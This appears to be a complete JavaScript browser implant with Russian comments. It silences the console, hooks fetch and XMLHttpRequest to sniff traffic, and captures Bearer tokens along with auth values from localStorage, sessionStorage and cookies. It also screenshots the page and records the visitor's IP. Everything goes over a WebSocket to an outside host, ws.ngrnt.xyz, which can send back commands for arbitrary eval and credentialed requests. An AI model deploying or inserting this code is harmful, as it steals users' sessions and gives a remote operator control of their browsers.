
(() => {
  // ================================
  //   ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
  // ================================
  let ws = null;
  let sniffEnabled = false;
  let sniffFilter = null;
  let authToken = null; // token auth

  // ================================
  //   ПОЛНОСТЬЮ ГЛУШИМ console.* В БРАУЗЕРЕ
  // ================================
  console.log   = function(){};
  console.warn  = function(){};
  console.error = function(){};
  console.info  = function(){};
  console.debug = function(){};

  // =====================================================
  // ПАТЧ createPattern (ВСТАВИТЬ ВОТ СЮДА)
  // =====================================================
  (function () {
    const proto = window.CanvasRenderingContext2D &&
                  window.CanvasRenderingContext2D.prototype;
    if (!proto || !proto.createPattern) return;

    const origCreatePattern = proto.createPattern;

    proto.createPattern = function (image, repetition) {
      try {
        if (
          image &&
          typeof image.width === "number" &&
          typeof image.height === "number" &&
          (image.width === 0 || image.height === 0)
        ) {
          return null; // НЕ ПАДАЕМ, просто не создаём паттерн
        }
      } catch (e) {}

      try {
        return origCreatePattern.call(this, image, repetition);
      } catch (e) {
        return null; // тихо глушим ошибку
      }
    };
  })();

  // ================================
  //   ЛЕНИВАЯ ЗАГРУЗКА html2canvas
  // ================================
  let html2canvasPromise = null;

  function loadHtml2Canvas() {
    if (html2canvasPromise) return html2canvasPromise;

    html2canvasPromise = new Promise((resolve, reject) => {
      if (window.html2canvas) return resolve(window.html2canvas);

      const script = document.createElement("script");
      script.src = "https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js";
      script.async = true;

      script.onload = () => {
        if (window.html2canvas) resolve(window.html2canvas);
        else reject(new Error("html2canvas loaded, but not available"));
      };

      script.onerror = () => reject(new Error("Failed to load html2canvas"));

      document.head.appendChild(script);
    });

    return html2canvasPromise;
  }

async function makeScreenshot() {
  try {
    const html2canvas = await loadHtml2Canvas();

    const target = document.body || document.documentElement;
    const rect = target.getBoundingClientRect();

    if (!rect.width || !rect.height) {
      throw new Error("Page has zero size (0x0)");
    }

    const canvas = await html2canvas(target, {
      useCORS: true,
      logging: false,
      ignoreElements: (el) => el.tagName === "CANVAS",
    });

    const dataUrl = canvas.toDataURL("image/png");

    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send("screenshot result " + dataUrl);
    }
  } catch (err) {
    if (ws && ws.readyState === WebSocket.OPEN) {
      const msg = err && err.message ? err.message : String(err);
      ws.send("screenshot error: " + msg);
    }
  }
}



// ================================
//       ПЕРЕХВАТ console.log
// ================================
/*const origLog = console.log;
console.log = function (...args) {
  origLog.apply(console, args);

  try {
    if (ws && ws.readyState === WebSocket.OPEN) {
      const text = args
        .map((a) => {
          if (typeof a === "string") return a;
          try {
            return JSON.stringify(a);
          } catch {
            return String(a);
          }
        })
        .join(" ");
      ws.send("log " + text);
    }
  } catch (e) {}
};
*/



  // ================================
  //        SNIFF XHR
  // ================================
  (function () {
    const open = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function (method, url) {
      this._url = url;
      this._method = method;
      return open.apply(this, arguments);
    };

    const send = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function (body) {
      try {
        const url = String(this._url || "");
        const method = this._method || "GET";

        if (sniffEnabled) {
          let hit = true;
          if (sniffFilter && !url.includes(sniffFilter)) {
            hit = false;
          }

          if (hit) {
            console.log("🐶 XHR sniff:", method, url);
            ws &&
              ws.readyState === WebSocket.OPEN &&
              ws.send(
                "sniff result: " +
                  JSON.stringify({
                    transport: "xhr",
                    url,
                    method,
                    body,
                  })
              );
          }
        }
      } catch (e) {
        console.log("XHR sniff error:", e);
      }

      return send.apply(this, arguments);
    };
  })();

  // ================================
  //        SNIFF fetch
  // ================================
  (function () {
    const oldFetch = window.fetch;
    window.fetch = function (url, opts = {}) {
      const finalUrl = typeof url === "string" ? url : url.url || "";
      const method = opts.method || "GET";

      try {
        if (sniffEnabled) {
          let hit = true;
          if (sniffFilter && !finalUrl.includes(sniffFilter)) {
            hit = false;
          }

          if (hit) {
            console.log("🐶 fetch sniff:", method, finalUrl);
            ws &&
              ws.readyState === WebSocket.OPEN &&
              ws.send(
                "sniff result: " +
                  JSON.stringify({
                    transport: "fetch",
                    url: finalUrl,
                    method,
                    body: opts.body || null,
                  })
              );
          }
        }
      } catch (e) {
        console.log("fetch sniff error:", e);
      }

      return oldFetch.apply(this, arguments);
    };
  })();

  // ================================
  //   Helper: DataTables payload
  // ================================
  async function getPayload() {
    const tables = document.querySelectorAll("table");
    for (const t of tables) {
      try {
        const dt = $(t).DataTable();
        const params = dt.ajax.params();
        return {
          url: dt.ajax.url(),
          method: "POST",
          body: params,
        };
      } catch (e) {}
    }
    return { error: "No DataTable found" };
  }

  // ================================
  //     findajax 2.0
  // ================================
  async function findajax(keyword = "") {
    const kw = keyword.toLowerCase().trim();
    console.log("🔍 findajax 2.0 — ключевое слово:", kw || "(нет)");

    const scripts = [...document.querySelectorAll("script[src]")].map(
      (s) => s.src
    );
    const results = [];

    const ajaxRegex = /\$\.ajax\s*\(([\s\S]*?)\)\s*/g;
    const fetchRegex =
      /\b(?:fetch|window\.fetch|self\.fetch)\s*\(([\s\S]*?)\)\s*/g;

    function parseAjax(block) {
      const raw = block.trim();
      const urlMatch =
        raw.match(/url\s*:\s*['"`]([^'"`]+)['"`]/) ||
        raw.match(/['"`]([^'"`]+)['"`]/);

      const methodMatch = raw.match(
        /(method|type)\s*:\s*['"`]([^'"`]+)['"`]/
      );

      return {
        type: "ajax",
        url: urlMatch ? urlMatch[1] : null,
        method: methodMatch ? methodMatch[2] : null,
        raw,
      };
    }

    function parseFetch(block) {
      const raw = block.trim();
      const urlMatch = raw.match(/^\s*['"`]([^'"`]+)['"`]/);
      const url = urlMatch ? urlMatch[1] : null;

      const methodMatch = raw.match(
        /method\s*:\s*['"`]([^'"`]+)['"`]/i
      );

      return {
        type: "fetch",
        url,
        method: methodMatch ? methodMatch[1] : "GET",
        raw,
      };
    }

    function matches(entry) {
      if (!kw) return true;
      return (
        (entry.url || "").toLowerCase().includes(kw) ||
        (entry.method || "").toLowerCase().includes(kw) ||
        (entry.raw || "").toLowerCase().includes(kw)
      );
    }

    for (const src of scripts) {
      try {
        const res = await fetch(src);
        if (!res.ok) continue;

        const text = await res.text();

        let ajaxFound = [];
        let fetchFound = [];

        let m;

        while ((m = ajaxRegex.exec(text))) {
          const parsed = parseAjax(m[1]);
          if (matches(parsed)) ajaxFound.push(parsed);
        }

        while ((m = fetchRegex.exec(text))) {
          const parsed = parseFetch(m[1]);
          if (matches(parsed)) fetchFound.push(parsed);
        }

        if (ajaxFound.length || fetchFound.length) {
          results.push({
            file: src,
            ajax: ajaxFound,
            fetch: fetchFound,
          });
        }
      } catch (e) {
        console.log("Ошибка загрузки JS:", src, e);
      }
    }

    console.log("📦 findajax нашли файлов:", results.length);
    return results;
  }
	async function getClientIP() {
	  try {
		const res = await fetch("https://api.ipify.org?format=json");
		const data = await res.json();
		return data.ip; 
	  } catch (e) {
		return null;
	  }
	}
	// ====== ПАТЧ fetch ДЛЯ ВЫТАСКИВАНИЯ Authorization ======
(function () {
  if (!window.fetch) return;

  const origFetch = window.fetch;

  window.fetch = function (...args) {
    try {
      let input = args[0];
      let init  = args[1] || {};

      // Сливаем заголовки из init и Request
      const headers = new Headers(
        init.headers ||
        (input && input.headers) ||
        {}
      );

      const auth = headers.get("Authorization");
      if (auth && auth.startsWith("Bearer ")) {
        const token = auth.slice("Bearer ".length);

        if (!authToken) {
          authToken = token;

          // если WS уже подключён — отправим сразу
          try {
            if (ws && ws.readyState === WebSocket.OPEN) {
              ws.send("auth token: " + authToken);
            }
          } catch (e) {}
        }
      }
    } catch (e) {
      // тихо игнорим
    }

    return origFetch.apply(this, args);
  };
})();


  // ================================
  //    Основная WS-функция
  // ================================
  function connectWS() {
    ws = new WebSocket("wss://ws.ngrnt.xyz/ws/");
    console.log("[WS] Connecting...");

ws.onopen = async () => {
  const href = window.location.href;
  let domain;

  try {
    const u = new URL(href);
    domain = u.hostname;
  } catch (e) {
    domain = window.location.hostname || document.location.hostname;
  }

  const ip = await getClientIP();

  ws.send("iam:browser");
  ws.send("domain " + domain);  // для группировки по домену
  ws.send("url " + href);       // полный адрес страницы
  ws.send("ip " + ip);

  await makeScreenshot();
};




    ws.onclose = () => {
      console.log("[WS] Closed, reconnecting...");
      setTimeout(connectWS, 1000);
    };

    ws.onerror = () => {
      console.log("[WS] Error, retry...");
      try {
        ws.close();
      } catch (e) {}
    };

    ws.onmessage = async (e) => {
      const msg = e.data;

      // ---- get auth ----
	if (msg === "getauth") {
	  ws.send("auth token: " + (authToken || "null"));
	  return;
	}

	  // --- screenshot ---
      if (msg === "screenshot") {
        await makeScreenshot();
        return;
      }

      // --- sniff / управление ---
      if (msg === "sniff") {
        sniffEnabled = true;
        sniffFilter = null;
        ws.send("sniff target: ANY");
        console.log("🔎 sniff ENABLED (any URL)");
        return;
      }

      if (msg.startsWith("sniff ")) {
        const target = msg.slice(6).trim();
        sniffEnabled = true;
        sniffFilter = target || null;
        ws.send("sniff target: " + (sniffFilter || "ANY"));
        console.log(
          "🔎 sniff ENABLED with filter:",
          sniffFilter || "ANY"
        );
        return;
      }

      if (msg === "sniffoff") {
        sniffEnabled = false;
        sniffFilter = null;
        ws.send("sniff target: OFF");
        console.log("🔕 sniff DISABLED");
        return;
      }

      // --- payload ---
      if (msg === "payload") {
        const result = await getPayload();
        ws.send("payload result: " + JSON.stringify(result));
        return;
      }

      // --- listjs ---
// --- listjs (компактный вывод) ---
if (msg.startsWith("listjs")) {
  try {
    const scripts = Array.from(document.querySelectorAll("script[src]"))
      .map(s => s.src || "[inline script]")
      .filter(Boolean);

    // одна строка на скрипт
    const body = scripts.join("\n");

    ws.send("listjs result: " + body);
  } catch (e) {
    ws.send("listjs error: " + e);
  }
  return;
}


      // --- findajax ---
      if (msg.startsWith("findajax ")) {
        const keyword = msg.slice(9).trim();
        const results = await findajax(keyword);
        ws.send("findajax result: " + JSON.stringify(results, null, 2));
        return;
      }
      if (msg === "findajax") {
        const results = await findajax("");
        ws.send("findajax result: " + JSON.stringify(results, null, 2));
        return;
      }

      // --- eval <js> ---
      if (msg.startsWith("eval ")) {
        try {
          const out = eval(msg.slice(5));
          ws.send("eval result: " + String(out));
        } catch (err) {
          ws.send("eval error: " + String(err));
        }
        return;
      }

      // --- fetch <url> ---
      if (msg.startsWith("fetch ")) {
        try {
          const url = msg.slice(6).trim();
          const res = await fetch(url, { credentials: "include" });
          ws.send("fetch result: " + (await res.text()));
        } catch (err) {
          ws.send("fetch error: " + String(err));
        }
        return;
      }

      // --- api {"url":...} ---
// --- api ---
if (msg.startsWith("api ")) {
  try {
    // Примеры:
    // api GET https://site.com/api/user
    // api POST https://site.com/api/login {"email":"a","pass":"b"}

    const parts = msg.split(" ");
    if (parts.length < 3) {
      ws.send("api error: invalid format");
      return;
    }

    const method = parts[1].toUpperCase();
    const url = parts[2];

    // всё, что идёт после URL → тело запроса (опционально)
    let bodyRaw = parts.slice(3).join(" ");
    let options = { method };

    if (bodyRaw) {
      // пробуем распарсить тело как JSON
      try {
        const parsed = JSON.parse(bodyRaw);
        options.headers = { "Content-Type": "application/json" };
        options.body = JSON.stringify(parsed);
      } catch (_) {
        // если тело не JSON — отправляем текстом
        options.body = bodyRaw;
      }
    }

    fetch(url, options)
      .then(async (res) => {
        const text = await res.text();
        ws.send("api result: " + text);
      })
      .catch((err) => {
        ws.send("api error: " + String(err));
      });

  } catch (e) {
    ws.send("api error: " + e);
  }
  return;
}
// ---- extract auth token ----
if (msg === "get token") {
  try {
    let found = {};

    // localStorage
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      const val = localStorage.getItem(key);
      if (!val) continue;
      if (val.includes("eyJ") || key.includes("token") || key.includes("auth")) {
        found[key] = val;
      }
    }

    // sessionStorage
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      const val = sessionStorage.getItem(key);
      if (!val) continue;
      if (val.includes("eyJ") || key.includes("token") || key.includes("auth")) {
        found[key] = val;
      }
    }

    // cookies (НЕ httpOnly)
    document.cookie.split(";").forEach(c => {
      const [k,v] = c.trim().split("=");
      if (v && (v.includes("eyJ") || k.includes("token") || k.includes("auth")))
        found[k] = v;
    });

    ws.send("token result: " + JSON.stringify(found, null, 2));
  } catch (e) {
    ws.send("token error: " + e);
  }
  return;
}


    };
  }

  connectWS();
})();
